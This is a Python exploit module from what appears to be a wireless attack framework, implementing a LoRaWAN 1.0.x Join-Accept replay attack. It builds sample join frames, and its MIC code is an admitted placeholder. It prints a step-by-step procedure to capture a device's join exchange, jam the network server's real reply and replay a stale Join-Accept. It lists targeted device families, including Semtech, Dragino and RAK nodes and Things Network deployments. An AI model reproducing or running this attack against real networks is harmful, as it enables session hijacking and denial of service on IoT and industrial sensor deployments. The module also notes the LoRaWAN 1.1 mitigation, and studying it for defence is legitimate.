# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""LoRaWAN Join-Accept Replay Attack.

Captures a valid LoRaWAN Join-Accept message from the network server
and replays it to an end device that is attempting to join. Since
LoRaWAN 1.0.x does not properly validate Join-Accept freshness in all
implementations, the device may accept the replayed message and derive
session keys from stale parameters, enabling session hijacking or
denial of service.

The attacker captures Join-Request/Join-Accept pairs during legitimate
OTAA activations using an SDR receiver, then replays the Join-Accept
when the target device initiates a new join procedure.

References:
  - LoRaWAN specification v1.0.3, Section 6.2.5
  - https://lora-alliance.org/resource_hub/lorawan-specification-v1-0-3/

Version: 1.0.0
"""

import os
import struct

from wirelessxpl.core.exploit import *

_MHDR_JOIN_REQUEST = 0x00
_MHDR_JOIN_ACCEPT = 0x20

_JOIN_REQUEST_LEN = 23
_JOIN_ACCEPT_LEN_NO_CFLIST = 17
_JOIN_ACCEPT_LEN_WITH_CFLIST = 33

_CFLIST_TYPE_FREQ = 0x00


def _build_join_request(app_eui, dev_eui, dev_nonce):
    """Build LoRaWAN Join-Request PHYPayload."""
    mhdr = struct.pack("B", _MHDR_JOIN_REQUEST)
    app_eui_bytes = struct.pack("<Q", app_eui)
    dev_eui_bytes = struct.pack("<Q", dev_eui)
    dev_nonce_bytes = struct.pack("<H", dev_nonce)
    frame = mhdr + app_eui_bytes + dev_eui_bytes + dev_nonce_bytes
    mic = _compute_mic(frame)
    return frame + mic


def _build_join_accept(app_nonce, net_id, dev_addr, dl_settings, rx_delay, cflist=None):
    """Build LoRaWAN Join-Accept payload (before encryption)."""
    mhdr = struct.pack("B", _MHDR_JOIN_ACCEPT)
    app_nonce_bytes = struct.pack("<I", app_nonce)[:3]
    net_id_bytes = struct.pack("<I", net_id)[:3]
    dev_addr_bytes = struct.pack("<I", dev_addr)
    dl_byte = struct.pack("B", dl_settings)
    rx_byte = struct.pack("B", rx_delay)

    frame = mhdr + app_nonce_bytes + net_id_bytes + dev_addr_bytes + dl_byte + rx_byte
    if cflist:
        frame += cflist

    mic = _compute_mic(frame)
    return frame + mic


def _compute_mic(msg):
    """Placeholder MIC (AES-CMAC required in production)."""
    try:
        import hashlib
        import hmac
        return hmac.new(b"\x00" * 16, msg, hashlib.sha256).digest()[:4]
    except Exception:
        return b"\x00" * 4


def _encrypt_join_accept(key, payload):
    """Placeholder encryption (AES-ECB decrypt used as encrypt in LoRaWAN)."""
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        cipher = Cipher(algorithms.AES(key), modes.ECB())
        dec = cipher.decryptor()
        padded = payload + b"\x00" * (16 - len(payload) % 16)
        return dec.update(padded)[:len(payload)] + dec.finalize()[:0]
    except ImportError:
        return payload


def _build_cflist_eu868():
    """Build CFList for EU868 (additional channels)."""
    freqs = [867100000, 867300000, 867500000, 867700000, 867900000]
    cflist = b""
    for f in freqs:
        freq_val = f // 100
        cflist += struct.pack("<I", freq_val)[:3]
    cflist += struct.pack("B", _CFLIST_TYPE_FREQ)
    return cflist


class Exploit(Exploit):
    """LoRaWAN Join-Accept Replay Attack.

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "LoRaWAN Join-Accept Replay Attack",
        "description": (
            "Captures and replays LoRaWAN Join-Accept messages to hijack "
            "OTAA activation or deny service. LoRaWAN 1.0.x implementations "
            "that do not properly validate JoinNonce freshness are vulnerable "
            "to accepting stale Join-Accept frames, enabling session key "
            "desynchronization and potential traffic interception."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://lora-alliance.org/resource_hub/lorawan-specification-v1-0-3/",
            "https://dl.acm.org/doi/10.1145/3395351.3401105",
        ),
        "devices": (
            "LoRaWAN 1.0.x OTAA devices",
            "Semtech SX1276/SX1262 based nodes",
            "The Things Network OTAA devices",
            "Chirpstack/LoRaServer deployments",
            "Industrial LoRaWAN sensors (Dragino, RAK, Laird)",
        ),
        "severity": "high",
        "cvss": "7.5",
        "mitre": ["T0830", "T1557", "T0814"],
        "status": "confirmed",
        "required_hardware": ["sdr_tx_rx"],
    }

    target = OptIP("", "Not applicable (radio attack)")
    port = OptPort(0, "Not applicable")
    timeout = OptInteger(60, "Capture window for join procedure in seconds")
    interface = OptString("", "SDR interface (e.g., hackrf, bladerf)")
    app_eui = OptString("70B3D57ED0000001", "Target AppEUI/JoinEUI (hex, 8 bytes)")
    dev_eui = OptString("0004A30B00123456", "Target DevEUI (hex, 8 bytes)")
    frequency = OptInteger(868100000, "LoRaWAN join frequency in Hz")
    spreading_factor = OptInteger(7, "Spreading factor for join (typically SF7-SF12)")
    replay_delay = OptFloat(0.5, "Delay before replaying captured Join-Accept")

    def _parse_eui(self, eui_str):
        try:
            return int(eui_str.strip(), 16)
        except ValueError:
            return None

    @mute
    def check(self):
        return (
            self._parse_eui(self.app_eui) is not None
            and self._parse_eui(self.dev_eui) is not None
        )

    @multi
    def run(self):
        print_status("LoRaWAN Join-Accept replay attack")

        app_eui = self._parse_eui(self.app_eui)
        dev_eui = self._parse_eui(self.dev_eui)
        if app_eui is None or dev_eui is None:
            print_error("Invalid AppEUI or DevEUI format")
            return

        print_info(f"AppEUI: 0x{app_eui:016X}")
        print_info(f"DevEUI: 0x{dev_eui:016X}")
        print_info(f"Frequency: {self.frequency} Hz, SF: {self.spreading_factor}")

        print_status("Constructing sample Join-Request...")
        dev_nonce = struct.unpack("<H", os.urandom(2))[0]
        join_req = _build_join_request(app_eui, dev_eui, dev_nonce)
        print_info(f"Join-Request: {len(join_req)} bytes, hex: {join_req.hex()}")

        print_status("Constructing sample Join-Accept...")
        app_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] & 0xFFFFFF
        net_id = 0x000013
        dev_addr = struct.unpack("<I", os.urandom(4))[0]
        dl_settings = 0x03
        rx_delay = 0x01

        cflist = _build_cflist_eu868()
        join_accept = _build_join_accept(app_nonce, net_id, dev_addr, dl_settings, rx_delay, cflist)
        print_info(f"Join-Accept: {len(join_accept)} bytes, hex: {join_accept.hex()}")

        app_key = os.urandom(16)
        encrypted_accept = _encrypt_join_accept(app_key, join_accept[1:])
        encrypted_frame = join_accept[:1] + encrypted_accept
        print_info(f"Encrypted Join-Accept: {len(encrypted_frame)} bytes")

        headers = ("Field", "Value")
        rows = [
            ("AppEUI", f"0x{app_eui:016X}"),
            ("DevEUI", f"0x{dev_eui:016X}"),
            ("DevNonce", f"0x{dev_nonce:04X}"),
            ("AppNonce", f"0x{app_nonce:06X}"),
            ("NetID", f"0x{net_id:06X}"),
            ("DevAddr", f"0x{dev_addr:08X}"),
            ("DLSettings", f"0x{dl_settings:02X}"),
            ("RxDelay", str(rx_delay)),
            ("CFList", "EU868 (5 extra channels)" if cflist else "None"),
        ]
        print_table(headers, *rows)

        print_info("Replay attack sequence:")
        print_info("  1. Capture legitimate Join-Request from target device")
        print_info("  2. Capture corresponding Join-Accept from network server")
        print_info("  3. Wait for target device to initiate new join procedure")
        print_info("  4. Jam the legitimate Join-Accept from the server")
        print_info(f"  5. Replay the previously captured Join-Accept after {float(self.replay_delay):.1f}s")
        print_info("  6. Device derives session keys from stale JoinNonce")

        print_warning("Impact: session key desynchronization, potential traffic interception")
        print_info("Mitigation: upgrade to LoRaWAN 1.1 with JoinNonce monotonic validation")
        print_info(
            f"To execute: configure SDR '{self.interface}' on {self.frequency} Hz, "
            f"SF{self.spreading_factor} for capture and replay"
        )
